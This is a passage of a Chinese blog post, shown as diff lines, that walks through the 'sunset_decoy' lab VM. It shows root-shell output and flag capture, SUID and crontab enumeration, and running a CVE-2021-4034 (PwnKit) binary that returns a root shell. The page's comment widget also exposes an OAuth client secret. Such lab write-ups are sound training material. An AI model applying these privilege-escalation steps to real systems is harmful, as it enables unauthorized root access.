class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">uname</span> -a<br>Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:0e:3c:2a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.131/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 413sec preferred_lft 413sec<br>    inet6 fe80::a00:27ff:fe0e:3c2a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-built_in">cd</span> root<br><span class="hljs-built_in">ls</span><br>chkrootkit-0.49<br>chkrootkit-0.49.tar.gz<br>log.txt<br>pspy<br>root.txt<br>script.sh<br><span class="hljs-built_in">cat</span> script.sh<br>FILE=/dev/shm/STTY5246<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span>; <span class="hljs-keyword">then</span><br>    /root/chkrootkit-0.49/chkrootkit<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;An AV scan will not be launched.&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">cat</span> root.txt<br>  ........::::::::::::..           .......|...............::::::::........<br>     .:::::;;;;;;;;;;;:::::.... .     \   | ../....::::;;;;:::::.......<br>         .       ...........   / \\_   \  |  /     ......  .     ........./\<br>...:::../\\_  ......     ..._/<span class="hljs-string">&#x27;   \\\_  \###/   /\_    .../ \_.......   _//</span><br><span class="hljs-string">.::::./   \\\ _   .../\    /&#x27;</span>      \\\\<span class="hljs-comment">#######//   \/\   //   \_   ....////</span><br>    _/      \\\\   _/ \\\ /  x       \\\\<span class="hljs-comment">###////      \////     \__  _/////</span><br>  ./   x       \\\/     \/ x X           \//////                   \/////<br> /     XxX     \\/         XxX X                                    ////   x<br>-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--<br>       X        _X      *    X      **         **             x   **    *  X<br>      _X                    _X           x                *          x     X_<br><br><br>1c203242ab4b4509233ca210d50d2cc5<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="另外一些提权尝试"><a href="#另外一些提权尝试" class="headerlink" title="另外一些提权尝试"></a>另外一些提权尝试</h3><p>我还尝试过的一些提权方法，首先是查看SUID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   134602     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp<br>   134749     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su<br>   135085     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount<br>   150671     24 -rwsr-xr-x   1 root     root        23288 Jan 15  2019 /usr/bin/pkexec<br>   131132     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh<br>   160068    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo<br>   131136     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd<br>   131134     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd<br>   135083     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount<br>   131131     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn<br>   150673     20 -rwsr-xr-x   1 root     root        18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   268427     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   148942    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   145624     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br></code></pre></td></tr></table></figure>
+
+<p>SUID 看到了 policykit-helper 尝试能不能提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ pkexec honeypot.decoy<br>==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===<br>Authentication is needed to run `./honeypot.decoy\<span class="hljs-string">&#x27; as the super user                                                </span><br><span class="hljs-string">Authenticating as: root</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">polkit-agent-helper-1: pam_authenticate failed: Authentication failure</span><br><span class="hljs-string">==== AUTHENTICATION FAILED ===</span><br><span class="hljs-string">Error executing command as another user: Not authorized                                                             </span><br><span class="hljs-string"></span><br><span class="hljs-string">This incident has been reported.</span><br></code></pre></td></tr></table></figure>
+
+<p>查看定时任务没收获</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *  * * *     root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6  * * *     root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6  * * 7     root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6  1 * *     root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure>
+
+<p>看看内核和版本号，使用 CVE-2021-4034 提权成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ <span class="hljs-built_in">chmod</span> +x CVE-2021-4034 <br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./CVE-2021-4034 <br>2023/07/19 09:24:40 CMDTOEXECUTE is empty fallback to default value<br>2023/07/19 09:24:40 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># whoami</span><br>root<br><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sunset_decoy 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/07/8964cc7f97f4.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/d14568407635.html" title="Obsidian 配置">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Obsidian 配置</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/b1e4b39f91d9.html" title="Spuktnik_1 靶机">
+                        <span class="hidden-mobile">Spuktnik_1 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'dc2b595ee891f52024282929f553e67a'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
